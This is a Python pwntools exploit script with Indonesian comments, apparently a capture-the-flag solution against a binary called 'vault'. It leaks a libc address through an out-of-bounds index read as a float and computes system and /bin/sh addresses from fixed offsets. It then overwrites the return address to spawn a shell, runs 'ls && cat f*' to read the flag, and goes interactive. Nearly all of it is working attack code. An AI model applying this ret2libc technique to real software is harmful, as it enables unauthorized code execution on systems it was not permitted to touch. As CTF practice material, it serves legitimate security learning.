from pwn import *
from struct import pack

p = process("./vault")
# p = remote("192.168.1.6", 1338)

def view(x):
    p.sendlineafter("> ", "1")
    p.sendlineafter("Masukkan no kotak : ", str(x))

def fill(x, y):
    p.sendlineafter("> ", "2")
    p.sendlineafter("Masukkan no kotak : ", str(x))
    p.sendlineafter("Masukkan isi baru : ", str(y))

def float_to_int(x):
    x = float(x)
    x = struct.pack("f", x)
    return u32(x)

def int_to_float(x):
    x = p32(x)
    return struct.unpack("f", x)[0]

def exploit():
    view(30) #address dari libc_start_main, sebenarnya index ke 30 seharusnya adalah return address, dilihat dari biasanya
             #return address terletak pada $ebp+0x4, namun setelah dilihat lebih baik, return address yang sebenarnya terdapat pada
             #libc_start_main - 4
    p.recvuntil(" : ")
    libc_leak = float_to_int(p.recvline()[:-1])
    
    log.info("Libc start main : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x018e81 #bisa cari offset di libc.blukat.me atau di libc-database github 
    log.info("Libc base : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03d200
    log.info("Libc system : {}".format(hex(libc_system)))
    libc_binsh = libc_base + 0x17e0cf
    log.info("Libc /bin/sh : {}".format(hex(libc_binsh)))
    
    fill(26, int_to_float(libc_system)) #ret addr sebenarnya terletak pada $ebp+0x4, namun address ini adalah address libc_start_main
                                        #didapatkan 26 melalui perhitungan address ret addr dikurangi dengan address array kotak
                                        #lalu dibagi dengan 4 yang menghasilkan angka 30 yaitu index libc_start_main
                                        #ret addr fungsi chall terletak pada libc_start_main - 4, tinggal dikurangi dan dapatlah index 26 
    fill(28, int_to_float(libc_binsh))
    
    p.sendline("ls && cat f*")
    sleep(1)
    p.interactive()

if __name__ == "__main__":
    exploit()
